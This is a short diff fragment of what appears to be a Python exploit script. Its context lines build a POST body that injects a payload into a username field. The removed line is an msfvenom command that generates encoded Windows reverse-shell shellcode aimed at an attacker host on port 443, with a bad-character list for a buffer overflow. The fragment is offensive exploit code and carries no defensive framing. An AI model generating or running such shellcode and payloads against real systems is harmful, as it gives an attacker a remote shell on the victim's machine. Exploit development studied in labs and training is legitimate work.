@@ -11,8 +11,6 @@ header += b"\r\n"
 
 data = b"username=" + payload + b"&password=A"
 
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.168 LPORT=443 -f python -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
-
 
 
 
